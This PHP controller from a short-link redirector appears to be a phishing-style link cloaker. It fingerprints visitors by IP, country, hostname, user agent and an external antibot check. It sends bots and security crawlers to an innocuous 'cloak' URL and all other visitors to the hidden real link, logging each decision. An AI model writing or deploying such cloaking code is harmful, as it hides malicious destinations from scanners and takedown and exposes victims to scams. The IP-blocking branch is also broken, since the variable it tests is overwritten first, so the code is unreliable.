<?php

Class Redirect extends CI_Controller{

    
    public function __construct(){
        parent::__construct();

        $this->load->model('blocker');

      if($this->agent->is_robot())
      {
          redirect('https://jamesclear.com');
      }

    }
    public function userIP()
	{
       $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'unknown';
    return $ipaddress;
    }
   
    public function iyh()
    {
      
        $short = $this->uri->segment(1);

        $q = $this->db->get_where('iyh_link', ['short' => $short]);
        
        if($q->num_rows() > 0)
        {
            $data = $q->row();
            $b = json_decode($data->blocker);
            $ip = $b[0];
            $host = $b[1];
            $agent = $b[2];
            $antibot = $b[3];

            $ip = $this->userIP();
            $country = $this->ip2location_lib->getCountryName($ip);
            // block robots.
            if($this->agent->is_robot())
            {
                $this->blocker->stats($data->id_link,'block',$ip,$country);
                redirect($data->cloak);
                exit;
            }
            //antibot
            if(isset($antibot) && $antibot == 'antibot')
            {
                if($this->blocker->antibot())
                {$this->blocker->stats($data->id_link,'antibot.pw_block',$ip,$country);
                    redirect($data->cloak);
                exit;
                }
            }
            // blocker hijaiyh
            if(isset($ip) && $ip == 'ip')
            {
                if($this->blocker->block_ip($this->userIP()))
                {$this->blocker->stats($data->id_link,'block',$ip,$country);
                    redirect($data->cloak);
                exit;
                }
            }
            if(isset($host) && $host == 'host')
            {
                if($this->blocker->block_host(gethostbyaddr($this->userIP())))
                {$this->blocker->stats($data->id_link,'block',$ip,$country);
                    redirect($data->cloak);
                exit;
                }
            }
            if(isset($agent) && $agent == 'agent')
            {
                if($this->blocker->block_agent($_SERVER['HTTP_USER_AGENT']))
                {$this->blocker->stats($data->id_link,'block',$ip,$country);
                    redirect($data->cloak);
                exit;
                }
            }

            // end.

            // allow.
            $this->blocker->stats($data->id_link,'allow',$ip,$country);
            redirect($data->link);
        }else{
            echo "cari ap? ";
        }
    }
}